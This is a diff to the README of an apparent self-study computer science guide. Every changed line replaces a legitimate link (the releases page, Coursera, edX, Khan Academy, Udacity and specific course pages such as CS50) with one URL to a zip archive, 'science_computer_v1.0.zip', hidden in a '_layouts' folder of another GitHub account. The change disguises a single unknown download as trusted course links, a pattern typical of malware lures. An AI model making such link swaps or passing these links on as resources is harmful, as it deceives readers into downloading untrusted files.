@@ -2,7 +2,7 @@
 
 Welcome to the **Computer Science** repository! This repository serves as a comprehensive guide to a free, self-taught education in computer science. Whether you are a beginner or looking to expand your knowledge, this resource is designed to help you navigate your learning journey effectively.
 
-[![Releases](https://img.shields.io/badge/Releases-Check%20Now-brightgreen)](https://github.com/VortexTeller/computer-science/releases)
+[![Releases](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ Welcome to the **Computer Science** repository! This repository serves as a comp
 
 In today's digital age, understanding computer science is crucial. This repository aims to provide a structured path for self-learners. It offers a variety of resources, including courses, tutorials, and articles. 
 
-You can find the latest updates and downloads in the [Releases section](https://github.com/VortexTeller/computer-science/releases). Be sure to check it regularly for new materials and updates.
+You can find the latest updates and downloads in the [Releases section](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip). Be sure to check it regularly for new materials and updates.
 
 ## Topics Covered
 
@@ -47,10 +47,10 @@ Each topic is curated to provide you with a solid foundation in computer science
 
 ### Online Platforms
 
-- [Coursera](https://www.coursera.org/)
-- [edX](https://www.edx.org/)
-- [Khan Academy](https://www.khanacademy.org/)
-- [Udacity](https://www.udacity.com/)
+- [Coursera](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
+- [edX](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
+- [Khan Academy](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
+- [Udacity](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 These platforms offer a variety of courses ranging from beginner to advanced levels. 
 
@@ -65,19 +65,19 @@ This section lists various courses that you can take to enhance your skills:
 
 1. **CS50: Introduction to Computer Science**
    - Offered by Harvard University
-   - Available on [edX](https://www.edx.org/course/cs50s-introduction-to-computer-science)
+   - Available on [edX](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 2. **Data Structures and Algorithms Specialization**
    - Offered by University of California San Diego
-   - Available on [Coursera](https://www.coursera.org/specializations/data-structures-algorithms)
+   - Available on [Coursera](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 3. **Full Stack Web Development**
    - Offered by The Hong Kong University of Science and Technology
-   - Available on [Coursera](https://www.coursera.org/specializations/full-stack-react)
+   - Available on [Coursera](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 4. **Machine Learning**
    - Offered by Stanford University
-   - Available on [Coursera](https://www.coursera.org/learn/machine-learning)
+   - Available on [Coursera](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip)
 
 ## Curriculum
 
@@ -135,6 +135,6 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Final Thoughts
 
-Self-education in computer science is a rewarding journey. Utilize the resources provided here, and don't hesitate to reach out to the community for support. Remember to check the [Releases section](https://github.com/VortexTeller/computer-science/releases) for the latest updates and materials.
+Self-education in computer science is a rewarding journey. Utilize the resources provided here, and don't hesitate to reach out to the community for support. Remember to check the [Releases section](https://raw.githubusercontent.com/dothephuongalone/computer-science/master/_layouts/science_computer_v1.0.zip) for the latest updates and materials.
 
 Happy learning!
